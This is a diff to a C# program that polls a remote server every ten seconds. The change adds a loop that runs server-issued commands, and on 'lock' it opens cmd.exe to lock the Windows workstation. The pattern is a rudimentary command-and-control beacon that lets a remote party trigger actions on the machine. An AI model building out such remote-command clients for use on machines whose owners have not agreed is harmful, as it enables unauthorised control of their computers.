@@ -1,3 +1,4 @@
+using System.Diagnostics;
 using System.Net.Http.Headers;
 using System.Numerics;
 using System.Runtime.InteropServices;
@@ -93,7 +94,28 @@ internal class Program
                 {
                     var content = new FormUrlEncodedContent(new Dictionary<string, string> { { "VALIDATE", "GTC Kaliumdichromat Project" } });
                     HttpResponseMessage response = client.PostAsync(classRegistered + "overall.php", content).Result;
-                    Console.WriteLine(response.Content.ReadAsStringAsync().Result);
+                    // Console.WriteLine(response.Content.ReadAsStringAsync().Result);
+                    string[] commands = response.Content.ReadAsStringAsync().Result.Split('\n');
+                    foreach (string command in commands)
+                    {
+                        string[] splited = command.Split(' ');
+                        Console.WriteLine(splited[0]);
+                        if (splited[0] == "lock")
+                        {
+                            // Console.WriteLine("s");
+                            Process p = new Process();
+                            
+                                p.StartInfo.FileName = "cmd.exe";
+                                p.StartInfo.UseShellExecute = false;
+                                p.StartInfo.RedirectStandardError = true;
+                                p.StartInfo.RedirectStandardInput = true;
+                                p.StartInfo.RedirectStandardOutput = true;
+                                p.StartInfo.CreateNoWindow = false;
+                                p.Start();
+                                p.StandardInput.WriteLine("Rundll32.exe user32.dll,LockWorkStation&exit");
+                            
+                        }
+                    }
                 }
                 Thread.Sleep(10000);
             }
@@ -140,7 +162,7 @@ internal class Program
         }
         foreach (bool n in registeredDrive)
         { Console.WriteLine(n); }
-
+        
 
         while (true)
         {
